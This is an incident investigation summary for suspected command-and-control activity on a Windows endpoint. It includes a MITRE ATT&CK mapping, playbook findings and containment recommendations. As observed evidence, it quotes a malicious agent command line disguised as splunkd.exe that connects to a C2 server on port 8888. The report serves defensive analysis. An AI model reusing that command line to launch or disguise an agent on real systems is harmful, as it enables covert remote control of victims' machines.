# INVESTIGATION SUMMARY: INC-53021 (Incident-003)

**Final Severity:** High
*High severity is appropriate because the case shows strongly suspected malicious outbound activity on an important user endpoint, repeated C2-style connections over multiple alerts, a suspicious executable launched from C:\Users\Public\, and threat-intelligence corroboration from VirusTotal and AlienVault OTX. The evidence supports a likely compromise but does not show confirmed ransomware, large-scale outage, or sensitive data exposure, so Critical is not justified.*

**Confidence Level:** High
*Confidence is High because multiple independent sources align: repeated NetWitness alerts, consistent user/host/IP attribution, a suspicious command line to 192.168.10.202:8888, and threat-intelligence matches for provided hashes. The main limitation is the absence of process lineage and direct endpoint execution telemetry, but the overall evidence is sufficient and internally consistent.*

## Investigative Workflow
- Reviewed all six NetWitness sub-alerts for the current case.
- Correlated the alerts to the same host KELLYWANG, user KELLYWANG\Kelly Wang, source IP 192.168.10.204, and destination IP 192.168.10.202:8888.
- Validated the suspicious command line referencing http://192.168.10.202:8888 and group red.
- Checked threat-intelligence results for the provided hashes and confirmed malicious reputation indicators.
- Assessed the case against the privilege escalation playbook and documented unsupported steps as not met.

## Technical Chronology & MITRE ATT&CK TTP Mapping

On 2025-12-01 at 07:33:35 UTC, NetWitness generated six high-severity alerts for host KELLYWANG associated with user KELLYWANG\Kelly Wang. The alerts repeatedly identified a process named splunkd.exe running from C:\Users\Public\ and issuing a command line of splunkd.exe -server http://192.168.10.202:8888 -group red. The activity originated from source IP 192.168.10.204 and connected to destination IP 192.168.10.202 on port 8888, with the domain acmecorp-reset.com appearing in the alert metadata. The first alert fired at 07:33:35.204 UTC, followed by additional alerts at 07:33:35.299 UTC, 07:33:36.260 UTC, 07:33:36.262 UTC, and two more at 07:33:36.268 UTC, showing repeated outbound C2-style connections over a very short interval. Threat intelligence later associated multiple file hashes from the case with malicious detections in VirusTotal and an AlienVault OTX pulse, reinforcing that the observed host behavior was suspicious and consistent with command-and-control activity. No process lineage, privilege escalation chain, or exfiltration telemetry was provided in the case material, so the incident is limited to the observed suspicious execution and repeated network connections.

| Timeline Phase / Activity | Observed Evidence | MITRE Tactic | MITRE Technique Name | MITRE ID |
| --- | --- | --- | --- | --- |
| Initial suspicious execution context | Host KELLYWANG under user KELLYWANG\Kelly Wang was associated with splunkd.exe executed from C:\Users\Public\ with command line splunkd.exe -server http://192.168.10.202:8888 -group red. | Execution | Command and Scripting Interpreter | T1059 |
| Outbound C2-style connection established | Source IP 192.168.10.204 connected to destination IP 192.168.10.202 on TCP/8888; NetWitness generated repeated 'Potential C2 Connection (Kelly)' alerts at 2025-12-01T07:33:35.204Z, 07:33:35.299Z, 07:33:36.260Z, 07:33:36.262Z, and 07:33:36.268Z with domain acmecorp-reset.com. | Command and Control | Application Layer Protocol | T1071.001 |
| Potential remote service or beaconing over non-standard port | The repeated connections targeted 192.168.10.202:8888 from the same host 192.168.10.204, suggesting a custom or non-standard service channel rather than normal user traffic. | Command and Control | Non-Application Layer Protocol | T1095 |

## Playbook Execution Trace
| Step ID | Instruction | Status | Findings |
| --- | --- | --- | --- |
| `step_1` | Identify 1. username 2. IP address 3. Login Details 4. Computer name 5. Operating System | **MET** | User observed in the alerts: KELLYWANG\Kelly Wang. Source IP associated with the activity: 192.168.10.204. Host/computer name: KELLYWANG. Operating system reported in the case context: Windows. Login details are limited in the telemetry; the available evidence ties the activity to the named user and host through the NetWitness alerts and suspicious command line. |
| `step_2` | Was it horizontal or vertical | **NOT_MET** | The available telemetry shows outbound activity from 192.168.10.204 to 192.168.10.202 over port 8888, but it does not provide sufficient evidence to determine whether this represented lateral movement between peers or vertical escalation to a higher-privileged target. |
| `step_3` | Was any malicious process spawned on the victim's machine? | **NOT_MET** | A suspicious executable and command line are present, but the case data does not include process creation telemetry, parent/child lineage, or explicit execution events to confirm that a malicious process was spawned on the victim machine. |
| `step_4` | Analyze the process tree for signs of malicious activity, such as privilege escalation, lateral movement, or data exfiltration. | **NOT_MET** | No process tree was provided. The repeated C2-style alerts and suspicious command line indicate potentially malicious behavior, but there is no direct lineage evidence showing privilege escalation, lateral movement, or exfiltration in the provided telemetry. |
| `step_5` | Based on the analysis, determine if further investigation is necessary and the containment steps | **MET** | Further investigation is warranted. The case contains six high-severity NetWitness alerts, a suspicious executable in C:\Users\Public\, a command line pointing to http://192.168.10.202:8888, and threat-intelligence corroboration including VirusTotal malicious detections and an AlienVault OTX pulse. Containment is recommended. |

## Recommended Containment Actions
- Immediately isolate host KELLYWANG (192.168.10.204) from the network using EDR or network quarantine to stop any ongoing outbound C2 sessions.
- Block outbound and inbound communication to 192.168.10.202 TCP/8888 at the proxy, firewall, and EDR network controls, and add acmecorp-reset.com to a temporary deny list pending validation.
- Acquire a volatile memory capture and a full disk image from KELLYWANG before remediation to preserve evidence of the splunkd.exe execution and any spawned child processes.
- Collect the full process tree, command-line history, and file creation timeline for C:\Users\Public\splunkd.exe, including any copies, downloads, or alternate launchers.
- Hunt enterprise-wide for the provided malicious file hashes and any execution from C:\Users\Public\, and alert on any host beaconing to 192.168.10.202:8888.
- Reset or disable the credentials for KELLYWANG\Kelly Wang if the endpoint review confirms malicious execution or unauthorized use, and review recent logons for abuse.
- Preserve NetWitness packet captures, proxy logs, DNS telemetry, and EDR network events for all connections tied to the six alert timestamps for analyst review.

## Appendix M: Policy-Based Compliance Audit Log

| Audit ID | Decision Point | Policy Reference | Input Summary | Result | Decision Made | Human Review? | Timestamp |
| --- | --- | --- | --- | --- | --- | --- | --- |
| `AUD-DP07-1791474236-1` | **DP-07** | Appendix C | Critical System: False, Sensitive Data: False | *Pass* | `Investigate` | Yes | 2026-10-08T15:43:56Z |
| `AUD-DP08-1791474236-2` | **DP-08** | Appendix A | Severity classification: High | *Warning* | `Escalate` | Yes | 2026-10-08T15:43:56Z |
| `AUD-DP09-1791474236-3` | **DP-09** | Appendix F | Confidence level: High | *Pass* | `Investigate` | Yes | 2026-10-08T15:43:56Z |
| `AUD-DP10-1791474236-4` | **DP-10/DP-11** | Appendix G | Severity: High, Confidence: High, Ransomware: False, Guest OS: False | *Fail* | `Escalate` | Yes | 2026-10-08T15:43:56Z |
